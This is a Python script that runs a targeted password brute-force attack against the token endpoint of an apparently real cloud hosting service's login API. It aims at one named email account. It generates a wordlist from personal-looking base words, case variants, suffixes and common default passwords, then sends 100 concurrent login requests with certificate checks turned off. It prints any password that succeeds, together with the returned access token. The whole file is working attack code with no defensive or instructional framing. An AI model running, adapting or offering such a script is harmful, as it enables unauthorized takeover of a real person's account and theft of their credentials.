import asyncio
import aiohttp
import itertools
import sys
import time

URL = "https://vm.play2go.cloud/api/auth/v4/public/token"
EMAIL = "hobotzode1@gmail.com"
CONCURRENCY = 100

BASE_WORDS = [
    "sezaze72", "Romart01",
    "sezaze", "romart", "Romart", "Sezaze",
    "hobotzode", "Hobotzode", "hobotzode1", "Hobotzode1",
    "play2go", "Play2go", "Play2Go",
]

SUFFIXES = [
    "", "!", "!!", "!!!", ".", "..", "1", "12", "123", "1234",
    "01", "02", "00", "69", "77", "88", "99",
    "!1", "!@", "!@#", "@", "#", "$", "*",
    "?", "?!", "1!", "12!", "123!",
]

EXTRA_PASSWORDS = [
    "admin", "Admin", "admin1", "Admin1", "admin123", "Admin123",
    "password", "Password", "password1", "Password1", "password123",
    "root", "Root", "root123", "123456", "12345678", "123456789",
    "qwerty", "Qwerty", "qwerty123", "letmein", "welcome", "Welcome1",
    "test", "Test", "test123", "Test123", "guest", "Guest",
    "sezaze72Romart01", "Romart01sezaze72",
    "sezaze72!", "sezaze72!!", "Romart01!", "Romart01!!",
    "Sezaze72", "Sezaze72!", "Sezaze72!!",
    "romart01", "romart01!", "romart01!!",
    "SEZAZE72", "ROMART01",
    "SEZAZE72!", "ROMART01!",
]


def generate_passwords():
    seen = set()
    passwords = []

    def add(p):
        if p and p not in seen:
            seen.add(p)
            passwords.append(p)

    for base in BASE_WORDS:
        for suffix in SUFFIXES:
            add(base + suffix)
            add(base.capitalize() + suffix)
            add(base.upper() + suffix)
            add(base.lower() + suffix)
            add(base.swapcase() + suffix)
            # reverse
            add(base[::-1] + suffix)

    for p in EXTRA_PASSWORDS:
        add(p)

    return passwords


found_event = asyncio.Event()
stats = {"tried": 0, "total": 0, "start": 0}


async def try_password(sem, session, password):
    if found_event.is_set():
        return None
    async with sem:
        if found_event.is_set():
            return None
        payload = {"email": EMAIL, "password": password}
        try:
            async with session.post(URL, json=payload, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                stats["tried"] += 1
                if resp.status == 200:
                    data = await resp.json()
                    found_event.set()
                    return (password, data)
                # print progress every 50
                if stats["tried"] % 50 == 0:
                    elapsed = time.time() - stats["start"]
                    rps = stats["tried"] / elapsed if elapsed > 0 else 0
                    print(f"  [{stats['tried']}/{stats['total']}] {rps:.0f} req/s ...", flush=True)
        except Exception as e:
            # retry once
            try:
                async with session.post(URL, json=payload, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    stats["tried"] += 1
                    if resp.status == 200:
                        data = await resp.json()
                        found_event.set()
                        return (password, data)
            except:
                pass
    return None


async def main():
    passwords = generate_passwords()
    stats["total"] = len(passwords)
    stats["start"] = time.time()

    print(f"[*] Target: {URL}")
    print(f"[*] Email:  {EMAIL}")
    print(f"[*] Passwords: {len(passwords)}")
    print(f"[*] Concurrency: {CONCURRENCY}")
    print(f"[*] Starting brute...\n")

    sem = asyncio.Semaphore(CONCURRENCY)
    connector = aiohttp.TCPConnector(limit=CONCURRENCY, limit_per_host=CONCURRENCY, ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [try_password(sem, session, p) for p in passwords]
        results = await asyncio.gather(*tasks)

    elapsed = time.time() - stats["start"]
    hit = [r for r in results if r]

    print(f"\n{'='*50}")
    if hit:
        pw, data = hit[0]
        print(f"[+] FOUND! Password: {pw}")
        print(f"[+] Token: {data}")
    else:
        print(f"[-] No match found.")
    print(f"[*] Tried {stats['tried']} passwords in {elapsed:.1f}s ({stats['tried']/elapsed:.0f} req/s)")


if __name__ == "__main__":
    asyncio.run(main())
